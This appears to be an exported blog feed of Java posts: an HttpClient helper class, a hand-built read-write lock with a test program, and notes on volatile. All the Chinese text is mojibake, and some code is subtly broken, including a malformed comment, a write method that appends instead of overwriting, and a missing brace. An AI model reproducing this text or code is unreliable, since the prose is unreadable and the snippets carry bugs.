{                // ËÆæÁΩÆÂà∞ËØ∑Ê±ÇÂ§¥Âà∞HttpRequestBaseÂØπË±°‰∏≠                httpMethod.setHeader(entry.getKey(), entry.getValue());            }        }    }    /**     * Description: Â∞ÅË£ÖË°®ÂçïËØ∑Ê±ÇÂèÇÊï∞     *     * @param params     * @param httpMethod     * @throws UnsupportedEncodingException     */    public static void packageFormParam(Map&lt;String, String&gt; params, HttpEntityEnclosingRequestBase httpMethod)            throws UnsupportedEncodingException {        // Â∞ÅË£ÖËØ∑Ê±ÇÂèÇÊï∞        if (params != null) {            List&lt;NameValuePair&gt; nvps = new ArrayList&lt;NameValuePair&gt;();            Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet();            for (Map.Entry&lt;String, String&gt; entry : entrySet) {                nvps.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));            }            // ËÆæÁΩÆÂà∞ËØ∑Ê±ÇÁöÑhttpÂØπË±°‰∏≠            httpMethod.setEntity(new UrlEncodedFormEntity(nvps, ENCODING));        }    }    /**     * Description: Â∞ÅË£ÖjsonËØ∑Ê±ÇÂèÇÊï∞     *     * @param params     * @param httpMethod     * @throws UnsupportedEncodingException     */    public static void packageJsonParam(Map&lt;String, String&gt; params, HttpEntityEnclosingRequestBase httpMethod)            throws UnsupportedEncodingException {        // Â∞ÅË£ÖËØ∑Ê±ÇÂèÇÊï∞        if (params != null) {            JSONObject jsonParam = new JSONObject();            Set&lt;Map.Entry&lt;String,String&gt;&gt; entrySet = params.entrySet();            for(Map.Entry&lt;String,String&gt;  entry : entrySet){                jsonParam.put(entry.getKey(),entry.getValue());            }            StringEntity entity = new StringEntity(jsonParam.toString(),ENCODING);            entity.setContentEncoding(ENCODING);            entity.setContentType(&quot;application/json&quot;);            // ËÆæÁΩÆÂà∞ËØ∑Ê±ÇÁöÑhttpÂØπË±°‰∏≠            httpMethod.setEntity(entity);        }    }    /**     * Description: ÈáäÊîæËµÑÊ∫ê     *     * @param httpResponse     * @param httpClient     * @throws IOException     */    public static void release(CloseableHttpResponse httpResponse, CloseableHttpClient httpClient) throws IOException {        // ÈáäÊîæËµÑÊ∫ê        if (httpResponse != null) {            httpResponse.close();        }        if (httpClient != null) {            httpClient.close();        }    }    /**     * Description: Ëé∑ÂæóÂìçÂ∫îÁªìÊûú     *     * @param httpResponse     * @param httpClient     * @param httpMethod     * @return     * @throws Exception     */    public static JSONObject getResponse(CloseableHttpResponse httpResponse,                                                       CloseableHttpClient httpClient, HttpRequestBase httpMethod) throws Exception {        // ÊâßË°åËØ∑Ê±Ç        httpResponse = httpClient.execute(httpMethod);        // Ëé∑ÂèñËøîÂõûÁªìÊûú        if (httpResponse != null &amp;&amp; httpResponse.getStatusLine() != null) {            StringBuffer content = new StringBuffer();            if (httpResponse.getEntity() != null) {                content.append(EntityUtils.toString(httpResponse.getEntity(), ENCODING));            }            return JSON.parseObject(content.toString());        }        JSONObject data = new JSONObject();        data.put(&quot;code&quot;,&quot;999&quot;);        data.put(&quot;content&quot;,&quot;ÁΩëÁªúÂºÇÂ∏∏&quot;);        return data;    }}</code></pre><h4 id="Â∑•ÂÖ∑ÂåÖÂäüËÉΩ"><a href="#Â∑•ÂÖ∑ÂåÖÂäüËÉΩ" class="headerlink" title="Â∑•ÂÖ∑ÂåÖÂäüËÉΩ"></a>Â∑•ÂÖ∑ÂåÖÂäüËÉΩ</h4><pre><code>+ Êèê‰æõget,postË°®ÂçïËØ∑Ê±Ç,postJsonËØ∑Ê±Ç+ ËøòÊúâÂÖ∂‰ªñÂäüËÉΩ,Ê¨¢ËøéÊù•pr,[È°πÁõÆÂú∞ÂùÄ](https://github.com/huskyui/httpclientutil)</code></pre><h4 id="ÂÜôÂ∑•ÂÖ∑ÂåÖÁöÑÂéüÂõ†"><a href="#ÂÜôÂ∑•ÂÖ∑ÂåÖÁöÑÂéüÂõ†" class="headerlink" title="ÂÜôÂ∑•ÂÖ∑ÂåÖÁöÑÂéüÂõ†"></a>ÂÜôÂ∑•ÂÖ∑ÂåÖÁöÑÂéüÂõ†</h4><p>Âõ†‰∏∫Ë¶ÅÁî®Âà∞ÂæÆ‰ø°ÁöÑÊé•Âè£,Âè™ËÉΩËá™Â∑±ÂáÜÂ§á‰∏Ä‰∏™.</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> httpClientÂ∑•ÂÖ∑Á±ª </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËØªÂÜôÈîÅ</title>
      <link href="/2019/09/02/%E8%AF%BB%E5%86%99%E9%94%81/"/>
      <url>/2019/09/02/%E8%AF%BB%E5%86%99%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h3 id="readWriteLock"><a href="#readWriteLock" class="headerlink" title="readWriteLock"></a>readWriteLock</h3><blockquote><p>ËØªÂÜôÈîÅ‰πüÂ∞±ÊòØÂÖ±‰∫´-Áã¨Âç†ÈîÅ,ËØªÈîÅ‰πãÈó¥ÂèØ‰ª•ÂÖ±‰∫´ÈîÅ,‰ΩÜÊòØËØªÈîÅÂíåÂÜôÈîÅ‰πãÈó¥‰∏çÂèØ‰ª•ÂÖ±‰∫´,ÂÜôÈîÅ‰πãÈó¥‰πü‰∏çÂèØÂÖ±‰∫´.</p></blockquote><blockquote><p>Â≠¶‰π†ÁöÑËøô‰∏™ËØªÂÜôÈîÅÁöÑËÆæËÆ°,ÂÆÉÁöÑÊ†∏ÂøÉÊòØ</p><p>1.Â§ö‰∏™Á∫øÁ®ã(ËØªÈîÅ,ÂÜôÈîÅ)ÈÉΩÊòØÁî®Âêå‰∏Ä‰∏™ÂØπË±°ÈîÅ,ÁÑ∂ÂêéÁî®sychronizedÊù•Âî§ÈÜíÂÖ®ÈÉ®‰ª•ÂèäÊ≤âÁù°.</p><p>2.ÂÆö‰πâ‰∫ÜËØªÈîÅÊï∞ÈáèÂèòÈáè,ÂΩìÂâçÂÜôÈîÅÊï∞Èáè,ÂΩìÂâçÁ≠âÂæÖÂÜôÈîÅÊï∞ÈáèÊù•ÊòØÂê¶ÈúÄË¶ÅÁù°Áú†ÂíåÂî§ÈÜí</p></blockquote><h4 id="lockÊé•Âè£"><a href="#lockÊé•Âè£" class="headerlink" title="lockÊé•Âè£"></a>lockÊé•Âè£</h4><pre><code>/** * ËØªÂÜôÈîÅÁöÑÂÜÖÊ∂µÂ∞±ÊòØÂÖ±‰∫´-Áã¨Âç†ÈîÅ * @author husky * @date 2019/8/27 9:44 */public interface Lock {    /**Ëé∑ÂèñÊòæÁ§∫ÈîÅ,Ê≤°ÊúâËé∑ÂæóÈîÅÁöÑÁ∫øÁ®ãÂ∞ÜË¢´ÈòªÂ°û*/    void lock() throws InterruptedException;    /**ÈáäÊîæÈîÅ*/    void unlock();}</code></pre><h4 id="ReadWriteLockÊé•Âè£"><a href="#ReadWriteLockÊé•Âè£" class="headerlink" title="ReadWriteLockÊé•Âè£"></a>ReadWriteLockÊé•Âè£</h4><pre><code>/** * @author husky * @date 2019/8/27 9:50 */public interface ReadWriteLock {    /**ÂàõÂª∫readerÈîÅ*/    Lock readLock();    /**ÂàõÂª∫writeÈîÅ*/    Lock writeLock();    /**Ëé∑ÂèñÂΩìÂâçÊúâÂ§öÂ∞ëÁ∫øÁ®ãÊ≠£Âú®ÊâßË°åÂÜôÊìç‰Ωú*/    int getWritingWriters();    /**Ëé∑ÂèñÂΩìÂâçÊúâÂ§öÂ∞ëÁ∫øÁ®ãÊ≠£Âú®Á≠âÂæÖËé∑ÂèñÂÜôÂÖ•ÈîÅ*/    int getWaitingWriters();    /**Ëé∑ÂèñÂΩìÂâçÊúâÂ§öÂ∞ëÁ∫øÁ®ãÊ≠£Âú®ÊâßË°åreaderÈîÅ*/    int getReadingReaders();    /**Â∑•ÂéÇÊñπÊ≥ï,ÂàõÂª∫ReadWriteLock*/    static ReadWriteLock readWriteLock(){        return new ReadWriteLockImpl();    }    /**Â∑•ÂéÇÊñπÊ≥ï,ÂàõÂª∫ReadWriteLock,Âπ∂‰∏î‰º†ÂÖ•preferWriter*/    static ReadWriteLock readWriteLock(boolean preferWriter){        return new ReadWriteLockImpl(preferWriter);    }}</code></pre><h4 id="readwriteLockÂÆûÁé∞Á±ª"><a href="#readwriteLockÂÆûÁé∞Á±ª" class="headerlink" title="readwriteLockÂÆûÁé∞Á±ª"></a>readwriteLockÂÆûÁé∞Á±ª</h4><pre><code>/** * ÂåÖÂèØËßÅ,ÂàõÂª∫Êó∂‰ΩøÁî®ReadWriteLockÁöÑcreateÊñπÊ≥ï * @author husky * @date 2019/8/27 10:59 */public class ReadWriteLockImpl implements ReadWriteLock {    /**ÂÆö‰πâÂØπË±°ÈîÅ*/    private final Object MUTEX = new Object();    /**ÂΩìÂâçÊúâÂ§öÂ∞ëÁ∫øÁ®ãÊ≠£Âú®ÂÜôÂÖ•*/    private int writingWriters = 0;    /**ÂΩìÂâçÊúâÂ§öÂ∞ëÁ∫øÁ®ãÊ≠£Âú®Á≠âÂæÖÂÜôÂÖ•*/    private int waitingWriters = 0;    /**ÂΩìÂâçÊúâÂ§öÂ∞ëÁ∫øÁ®ãÊ≠£Âú®read*/    private int readingReaders = 0;    /**readÂíåwriteÁöÑÂÅèÂ•ΩËÆæÁΩÆ*/    private boolean preferWriter;    public ReadWriteLockImpl(){        this(true);    }    public ReadWriteLockImpl(boolean preferWriter){        this.preferWriter = preferWriter;    }    @Override    public Lock readLock() {        return new ReadLock(this);    }    @Override    public Lock writeLock() {        return new WriteLock(this);    }    /**‰ΩøÂÜôÁ∫øÁ®ãÁöÑÊï∞ÈáèÂ¢ûÂä†*/    void incrementWritingWriters(){        this.writingWriters++;    }    /**‰ΩøÁ≠âÂæÖÂÜôÂÖ•ÁöÑÁ∫øÁ®ãÊï∞ÈáèÂ¢ûÂä†*/    void incrementWaitingWriters(){        this.waitingWriters++;    }    /**‰ΩøËØªÁ∫øÁ®ãÁöÑÊï∞ÈáèÂ¢ûÂä†*/    void incrementReadingReaders(){        this.readingReaders++;    }    /**‰ΩøÂÜôÁ∫øÁ®ãÁöÑÊï∞ÈáèÂáèÂ∞ë*/    void decrementWritingWriters(){        this.writingWriters--;    }    /**‰ΩøÁ≠âÂæÖËé∑ÂèñÂÜôÂÖ•ÈîÅÁöÑÊï∞ÈáèÂáè‰∏Ä*/    void decrementWaitingWriters(){        this.waitingWriters--;    }    /**‰ΩøËØªÂèñÁ∫øÁ®ãÁöÑÊï∞ÈáèÂáè‰∏Ä*/    void decrementReadingReaders(){        this.readingReaders--;    }    @Override    public int getWritingWriters() {        return this.writingWriters;    }    @Override    public int getWaitingWriters() {        return this.waitingWriters;    }    @Override    public int getReadingReaders() {        return this.readingReaders;    }    /**Ëé∑ÂèñÂØπË±°ÈîÅ*/    Object getMutex(){        return this.MUTEX;    }    /**Ëé∑ÂèñÂΩìÂâçÊòØÂê¶ÂÅèÂêëÂÜôÈîÅ*/    boolean getPreferWriter(){        return this.preferWriter;    }    /**ËÆæÁΩÆÂÜôÈîÅÂÅèÂ•Ω*/    void changePrefer(boolean preferWriter){        this.preferWriter = preferWriter;    }}</code></pre><h4 id="readLock"><a href="#readLock" class="headerlink" title="readLock"></a>readLock</h4><pre><code>/** * @author husky * @date 2019/8/29 16:38 */class ReadLock implements Lock{    private final ReadWriteLockImpl readWriteLock;    ReadLock(ReadWriteLockImpl readWriteLock){        this.readWriteLock = readWriteLock;    }    @Override    public void lock() throws InterruptedException {        //‰ΩøÁî®mutex‰Ωú‰∏∫ÈîÅ        synchronized (readWriteLock.getMutex()){            //Ëã•Ê≠§Êó∂ÊúâÁ∫øÁ®ãÂú®ËøõË°åÂÜôÊìç‰Ωú,ÊàñËÄÖÂÅèÂêëÂÜôÈîÅÁöÑÊ†áÂøó‰∏∫trueÊó∂ÈÇ£‰πàÁ≠âÂæÖÂÜôÈîÅÊï∞Èáè&gt;0Êó∂,Â∞±‰ºöÊó†Ê≥ïËé∑ÂæóËØªÈîÅ            while(readWriteLock.getWritingWriters()&gt;0||(readWriteLock.getPreferWriter()&amp;&amp;readWriteLock.getWaitingWriters()&gt;0)){                readWriteLock.getMutex().wait();            }            readWriteLock.incrementReadingReaders();        }    }    @Override    public void unlock() {        //‰ΩøÁî®Mutex‰Ωú‰∏∫ÈîÅ,Âπ∂‰∏îËøõË°åÂêåÊ≠•        synchronized (readWriteLock.getMutex()){            //ÈáäÊîæÈîÅ‰ΩøÂΩìÂâçreadingÁöÑÊï∞ÈáèÂáè‰∏Ä            //Â∞ÜperferWriterËÆæÁΩÆ‰∏∫true,ÂèØ‰ª•‰ΩøÂæówriterÁ∫øÁ®ãËé∑ÂæóÊõ¥Â§öÊú∫‰ºö            //ÈÄöÁü•Âî§ÈÜí‰∏éMutexÂÖ≥ËÅîmonitor waitset‰∏≠ÁöÑÁ∫øÁ®ã            readWriteLock.decrementReadingReaders();            readWriteLock.changePrefer(true);            readWriteLock.getMutex().notifyAll();        }    }}</code></pre><h4 id="writeLock"><a href="#writeLock" class="headerlink" title="writeLock"></a>writeLock</h4><pre><code>** * @author husky * @date 2019/8/29 16:55 */class WriteLock implements Lock{    private final ReadWriteLockImpl readWriteLock;    WriteLock(ReadWriteLockImpl readWriteLock){        this.readWriteLock = readWriteLock;    }    @Override    public void lock() throws InterruptedException {        synchronized (readWriteLock.getMutex()){            try{                //È¶ñÂÖà‰ΩøÁ≠âÂæÖËé∑ÂèñÂÜôÂÖ•ÈîÅÁöÑÊï∞Â≠óÂä†‰∏Ä                readWriteLock.incrementWaitingWriters();                //Â¶ÇÊûúÊúâÁ∫øÁ®ãÂú®ËØªÂèñÊï∞ÊçÆÊàñËÄÖÂÜôÊï∞ÊçÆ                while(readWriteLock.getWritingWriters()&gt;0||readWriteLock.getReadingReaders()&gt;0){                    readWriteLock.getMutex().wait();                }            }finally {                //ÊúÄÁªàÂáèÂ∞ëÁ≠âÂæÖÂÜôÁ∫øÁ®ãÁöÑÊï∞Èáè                readWriteLock.decrementWaitingWriters();            }            //Ëé∑ÂèñÂà∞ÈîÅÂêé,Â¢ûÂä†Ê≠£Âú®ÂÜôÈîÅÁöÑÊï∞Èáè            readWriteLock.incrementWritingWriters();        }    }    @Override    public void unlock() {        synchronized (readWriteLock.getMutex()){            //ÂáèÂ∞ëÊ≠£Âú®ÂÜôÂÖ•ÈîÅÁöÑÁ∫øÁ®ãËÆ°Êï∞Âô®            readWriteLock.decrementWritingWriters();            //Â∞ÜÂÅèÂ•ΩËÆæÁΩÆÊàêfalse,ÂèØ‰ª•‰ΩøÂæóËØªÈîÅË¢´Êõ¥Âø´ÈÄüÁöÑËé∑Âæó            readWriteLock.changePrefer(false);            //ÈÄöÁü•Âî§ÈÜíÂÖ∂‰ªñÂú®Mutext monitor wautset‰∏≠ÂÖ∂‰ªñÁ∫øÁ®ã            readWriteLock.getMutex().notifyAll();        }    }}</code></pre><h4 id="Êìç‰ΩúÊï∞ÊçÆÊé•Âè£"><a href="#Êìç‰ΩúÊï∞ÊçÆÊé•Âè£" class="headerlink" title="Êìç‰ΩúÊï∞ÊçÆÊé•Âè£"></a>Êìç‰ΩúÊï∞ÊçÆÊé•Âè£</h4><pre><code>import java.util.ArrayList;import java.util.List;import java.util.concurrent.TimeUnit;/** * @author husky * @date 2019/8/29 17:12 */public class ShareData {    /**ÂÆö‰πâÂÖ±‰∫´Êï∞ÊçÆ(ËµÑÊ∫ê)*/    private final List&lt;Character&gt; container = new ArrayList&lt;&gt;();    /**ÊûÑÈÄ†ReadWriteLock*/    private final ReadWriteLock readWriteLock = ReadWriteLock.readWriteLock();    /**ÂàõÂª∫ËØªÂèñÈîÅ*/    private final Lock readLock = readWriteLock.readLock();    /**ÂàõÂª∫ÂÜôÂÖ•ÈîÅ*/    private final Lock writeLock = readWriteLock.writeLock();    private final int length;    public ShareData(int length){        this.length = length;        for(int i = 0;i &lt; length;i++){            container.add(i,&apos;c&apos;);        }    }    public char[] read() throws InterruptedException{        try{            //È¶ñÂÖàËøõË°åËØªÈîÅËøõË°ålock            readLock.lock();            char[] newBuffer = new char[length];            for(int i = 0;i &lt; length;i++){                newBuffer[i] = container.get(i);            }            slowly();            return newBuffer;        }finally {            //ÂΩìËØªÂèñÊìç‰ΩúÁªìÊùüÂêé,ÈáäÊîæÈîÅ            readLock.unlock();        }    }    public void write(char c) throws InterruptedException{        try{            writeLock.lock();            for(int i = 0;i &lt; length;i++){                this.container.add(i,c);            }            slowly();        }finally {            writeLock.unlock();        }    }    public void slowly(){        try{            TimeUnit.SECONDS.sleep(1);        }catch (InterruptedException e){            e.printStackTrace();        }    }}</code></pre><h4 id="ÊµãËØïÁ±ª"><a href="#ÊµãËØïÁ±ª" class="headerlink" title="ÊµãËØïÁ±ª"></a>ÊµãËØïÁ±ª</h4><pre><code>import static java.lang.Thread.currentThread;/** * @author husky * @date 2019/8/29 17:12 */public class ReadWriteLockTest {    /**this is the example for read write lock*/    private final static String text = &quot;Thisistheexampleforreadwritelock&quot;;    public static void main(String[] args) {        //ÂÆö‰πâÂÖ±‰∫´Êï∞ÊçÆ        final ShareData shareData = new ShareData(50);        //ÂàõÂª∫‰∏§‰∏™Á∫øÁ®ãËøõË°åÊï∞ÊçÆÂÜôÊìç‰Ωú        for(int i = 0;i &lt; 2;i++){            new Thread(()-&gt;{                for(int index = 0;index &lt; text.length();index++){                    try{                        char c = text.charAt(index);                        shareData.write(c);                        System.out.println(currentThread()+&quot; write &quot; + c);                    }catch (InterruptedException e){                        e.printStackTrace();                    }                }            }).start();        }        //ÂàõÂª∫10‰∏™Á∫øÁ®ãËøõË°åÊï∞ÊçÆËØªÊìç‰Ωú        for(int i = 0;i &lt; 10;i++){            new Thread(()-&gt;{                while(true){                    try {                        System.out.println(currentThread() + &quot; read &quot; + new String(shareData.read()));                    } catch (InterruptedException e) {                        e.printStackTrace();                    }                }            }).start();        }    }</code></pre><h4 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h4><blockquote><p>ReentrantReadWriteLockÁöÑÊìç‰ΩúÊµÅÁ®ãÂíå‰∏äÈù¢ÁöÑÊìç‰ΩúÁõ∏‰ºº,ÂÖ∑‰ΩìÁî®Âà∞ÂêéÁª≠ÂÜçËÅä</p></blockquote><blockquote><p>ËØªÂÜôÈîÅÂ∫îÁî®Âú∫ÊôØÂèØ‰ª•Âú®ÁºìÂ≠òÈÉ®ÂàÜÊàñËÄÖÂú®‰∏Ä‰∫õÈõÜÂêàÁ±ª‰∏≠‰ΩøÁî®</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> ËØªÂÜôÈîÅ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volatileÂÖ≥ÈîÆÂ≠ó</title>
      <link href="/2019/08/21/volatile%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2019/08/21/volatile%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂÜÖÂ≠ò-cache-ÂíåÂØÑÂ≠òÂô®‰πãÈó¥ÁöÑÂÖ≥Á≥ª"><a href="#ÂÜÖÂ≠ò-cache-ÂíåÂØÑÂ≠òÂô®‰πãÈó¥ÁöÑÂÖ≥Á≥ª" class="headerlink" title="ÂÜÖÂ≠ò,cache,ÂíåÂØÑÂ≠òÂô®‰πãÈó¥ÁöÑÂÖ≥Á≥ª"></a>ÂÜÖÂ≠ò,cache,ÂíåÂØÑÂ≠òÂô®‰πãÈó¥ÁöÑÂÖ≥Á≥ª</h3><p>ÂØÑÂ≠òÂô®ÊòØÁî®‰∫éËÆ°ÁÆóÊï∞ÊçÆ,ËÄåcpuÊâÄËÉΩËÆøÈóÆÁöÑÊï∞ÊçÆÈÉΩÊòØ‰∏ªÂ≠ò‰∏≠ÁöÑ.ÂØÑÂ≠òÂô®ÈÄüÂ∫¶ÈöèÊó∂‰ª£Ë°åÈïøË∂äÊù•Ë∂äÂø´,‰ΩÜÊòØËØªÂèñÊï∞ÊçÆÂç¥ÊòØÊ≤°ÊúâÂ§™Â§ßÂèëÂ±ï.ÊâÄ‰ª•Êúâ‰∫ÜcacheËøôÊ†∑ÁöÑ‰∏úË•ø</p><h3 id="È´òÂπ∂Âèë‰∏âÂ§ßÁâπÊÄß"><a href="#È´òÂπ∂Âèë‰∏âÂ§ßÁâπÊÄß" class="headerlink" title="È´òÂπ∂Âèë‰∏âÂ§ßÁâπÊÄß"></a>È´òÂπ∂Âèë‰∏âÂ§ßÁâπÊÄß</h3><ul><li>ÂéüÂ≠êÊÄß <ul><li>Â§ö‰∏™ÂéüÂ≠êÊÄßÊìç‰ΩúÂú®‰∏ÄËµ∑Â∞±‰∏çÂÜçÊòØÂéüÂ≠êÊÄßÊìç‰Ωú‰∫Ü </li><li>ÁÆÄÂçïÁöÑËØªÂèñÂíåËµãÂÄºÊìç‰ΩúÊòØÂéüÂ≠êÊÄßÁöÑ,Â∞Ü‰∏Ä‰∏™ÂèòÈáèËµãÁªôÂè¶Â§ñ‰∏Ä‰∏™ÂèòÈáèÁöÑÊìç‰Ωú‰∏çÊòØÂéüÂ≠êÊÄßÁöÑ. </li><li>JavaÂÜÖÂ≠òÊ®°Âûã(JMM)Âè™‰øùËØÅ‰∫ÜÂü∫Êú¨ËØªÂèñÂíåËµãÂÄºÁöÑÂéüÂ≠êÊÄßÊìç‰Ωú,ÂÖ∂‰ªñÂùá‰∏ç‰øùËØÅ,Â¶ÇÊûúÈúÄË¶ÅÊüê‰∫õ‰ª£Á†ÅÂùóËÉΩÂ§üÊã•ÊúâÂéüÂ≠êÊÄß,ÈúÄË¶Å‰ΩøÁî®ÂÖ≥ÈîÆÂ≠ósynchronized,ÊàñËÄÖJUC‰∏≠ÁöÑlock.Â¶ÇÊûúÊÉ≥Ë¶Å‰ΩøÁî®intÁ≠âÁ±ªÂûãËá™Â¢ûÊìç‰ΩúÂÖ∑Â§áÂéüÂ≠êÊÄß,ÂèØ‰ª•‰ΩøÁî®JUCÂåÖ‰∏ãÁöÑÂéüÂ≠êÂ∞ÅË£ÖÁ±ªÂûãjava.util.concurrent.atomic.* </li><li>ÊÄªÁªì:volatileÂÖ≥ÈîÆÂ≠ó‰∏çÂÖ∑Â§áÂéüÂ≠êÊÄßÁöÑËØ≠‰πâ,ÈúÄË¶ÅsynchronizedÊàñËÄÖlock </li></ul></li><li>ÂèØËßÅÊÄß <ul><li>‰ΩøÁî®volatile,ÂΩì‰∏Ä‰∏™ÂèòÈáèË¢´volatileÂÖ≥ÈîÆÂ≠ó‰øÆÈ•∞Êó∂,ÂØπ‰∫éÂÖ±‰∫´ËµÑÊ∫êÁöÑËØªÊìç‰Ωú‰ºöÁõ¥Êé•Âú®‰∏ªÂÜÖÂ≠ò‰∏≠ËøõË°å,ÂØπ‰∫éÂÖ±‰∫´ËµÑÊ∫êÁöÑÂÜôÊìç‰ΩúÂΩìÁÑ∂ÊòØÂÖà‰øÆÊîπÂ∑•‰ΩúÂÜÖÂ≠ò,‰ΩÜÊòØ‰øÆÊîπÁªìÊùüÂêé,‰ºöÁ´ãÂàªÂà∑Êñ∞Âà∞‰∏ªÂÜÖÂ≠ò‰∏≠. </li><li>ÈÄöËøásynchronizedÂÖ≥ÈîÆÂ≠óËÉΩÂ§ü‰øùËØÅÂèØËßÅÊÄß,synchronizedÂÖ≥ÈîÆÂ≠óËÉΩÂ§ü‰øùËØÅÂêå‰∏ÄÊó∂ÂàªÂè™Êúâ‰∏Ä‰∏™Á∫øÁ®ãËé∑ÂæóÈîÅ,ÁÑ∂ÂêéÊåáÂêëÂêåÊ≠•ÊñπÊ≥ï,Âπ∂‰∏îËøò‰ºöÁ°Æ‰øùÂú®ÈîÅÈáäÊîæ‰πãÂâç,‰ºöÂ∞ÜÂØπÂèòÈáèÁöÑ‰øÆÊîπÂà∑Êñ∞Âà∞‰∏ªÂÜÖÂ≠ò‰∏≠. </li><li>ÈÄöËøáJUCÊèê‰æõÁöÑÊòæÁ§∫ÈîÅLock‰πüËÉΩÂ§ü‰øùËØÅÂèØËßÅÊÄß,LockÁöÑlockÊñπÊ≥ïËÉΩÂ§ü‰øùËØÅÂú®Âêå‰∏Ä‰∏™Êó∂ÂàªÂè™Êúâ‰∏Ä‰∏™Á∫øÁ®ãËé∑ÂèñÈîÅÁÑ∂ÂêéÊâßË°åÂêåÊ≠•ÊñπÊ≥ï,Âπ∂Á°Æ‰øùÂú®ÈîÅÈáäÊîæ‰πãÂâçÂ∞ÜÂØπÂèòÈáèÁöÑ‰øÆÊîπÂà∑Êñ∞Âà∞‰∏ªÂÜÖÂ≠ò‰∏≠. </li></ul></li><li>ÊúâÂ∫èÊÄß <ul><li>‰ΩøÁî®volatileÂÖ≥ÈîÆÂ≠óÊù•‰øùËØÅÊúâÂ∫èÊÄß </li><li>‰ΩøÁî®synchronizedÂÖ≥ÈîÆÂ≠óÊù•‰øùËØÅÊúâÂ∫èÊÄß </li><li>‰ΩøÁî®LockÊù•‰øùËØÅÊúâÂ∫èÊÄß </li></ul></li></ul><blockquote><p>ÊÄªÁªì:volatileÂèØ‰ª•ÂÆûÁé∞ÂèØËßÅÊÄß,ÊúâÂ∫èÊÄß,‰ΩÜÊòØ‰∏çÂèØÂÆûÁé∞ÂéüÂ≠êÊÄß</p></blockquote><h3 id="volatileÂíåsynchronized"><a href="#volatileÂíåsynchronized" class="headerlink" title="volatileÂíåsynchronized"></a>volatileÂíåsynchronized</h3><ul><li><p>‰ΩøÁî®‰∏äÁöÑÂå∫Âà´ </p><ul><li>volatileÂÖ≥ÈîÆÂ≠óÂè™ËÉΩÁî®‰∫é‰øÆÈ•∞ÂÆû‰æãÂèòÈáèÊàñËÄÖÁ±ªÂèòÈáè,‰∏çËÉΩ‰øÆÈ•∞ÊñπÊ≥ï‰ª•ÂèäÊñπÊ≥ïÂèÇÊï∞ÂíåÂ±ÄÈÉ®ÂèòÈáè,Â∏∏ÈáèÁ≠â </li><li>synchronizedÂÖ≥ÈîÆÂ≠ó‰∏çËÉΩÁî®‰∫éÂØπÂèòÈáèÁöÑ‰øÆÈ•∞,Âè™ËÉΩÁî®‰∫é‰øÆÈ•∞ÊñπÊ≥ïÊàñËÄÖËØ≠Âè•Âùó </li><li>volatile‰øÆÈ•∞ÁöÑÂèòÈáèÂèØ‰ª•‰∏∫null,synchronizedÂÖ≥ÈîÆÂ≠óÂêåÊ≠•ËØ≠Âè•Ê°ÜÁöÑmonitorÂØπË±°‰∏çËÉΩ‰∏∫null </li></ul></li><li><p>ÂØπÂéüÂ≠êÊÄßÁöÑ‰øùËØÅ </p><ul><li>volatileÊó†Ê≥ï‰øùËØÅÂéüÂ≠êÊÄß </li><li>Áî±‰∫ésynchronizedÊòØ‰∏ÄÁßçÊéí‰ªñÁöÑÊú∫Âà∂,Âõ†Ê≠§Ë¢´synchronizedÂÖ≥ÈîÆÂ≠ó‰øÆÈ•∞ÁöÑÂêåÊ≠•‰ª£Á†ÅÊó†Ê≥ïË¢´‰∏≠Êñ≠ÊâìÊñ≠,Âõ†Ê≠§ËÉΩÂ§ü‰øùËØÅ‰ª£Á†ÅÁöÑÂéüÂ≠êÊÄß </li></ul></li><li><p>ÂèØËßÅÊÄßÁöÑ‰øùËØÅ </p><ul><li>‰∏§ËÄÖÂùáÂèØ‰ª•‰øùËØÅÂÖ±‰∫´ËµÑÊ∫êÂú®Â§öÁ∫øÁ®ãÈó¥ÁöÑÂèØËßÅÊÄß,‰ΩÜÊòØÂÆûÁé∞Êú∫Âà∂ÂÆåÂÖ®‰∏çÂêå. </li><li>synchronizedÂÄüÂä©‰∫éJVMÊåá‰ª§monitor enterÂíåmonitor exitÂØπÈÄöËøáÊéí‰ªñÁöÑÊñπÂºè‰ΩøÂæóÂêåÊ≠•‰ª£Á†Å‰∏≤Ë°åÂåñ,Âú®monitor exitÊó∂ÊâÄÊúâÂÖ±‰∫´Êï∞ÊçÆÈÉΩ‰ºöË¢´Âà∑Êñ∞Âà∞‰∏ªÂÜÖÂ≠ò‰∏≠. </li><li>Áõ∏ËæÉ‰∏ésynchronizedÂÖ≥ÈîÆÂ≠óvolatile‰ΩøÁî®Êú∫Âô®Êåá‰ª§(ÂÅèÁ°¨‰ª∂)‚Äùlock;‚ÄùÁöÑÊñπÂºèËø´‰ΩøÂÖ∂‰ªñÁ∫øÁ®ãÂ∑•‰ΩúÂÜÖÂ≠ò‰∏≠ÁöÑÊï∞ÊçÆÂ§±Êïà,‰∏çÂæóÂà∞‰∏ªÂÜÖÂ≠ò‰∏≠ËøõË°åÂÜçÊ¨°Âä†ËΩΩ. </li></ul></li><li><p>ÊúâÂ∫èÊÄßÁöÑ‰øùËØÅ </p><ul><li>volatileÂÖ≥ÈîÆÂ≠óÁ¶ÅÊ≠¢JVMÁºñËØëÂô®‰ª•ÂèäÂ§ÑÁêÜÂô®ÂØπÂÖ∂ËøõË°åÈáçÊéíÂ∫è,ÊâÄ‰ª•ÂÆÉËÉΩÂ§ü‰øùËØÅÊúâÂ∫èÊÄß 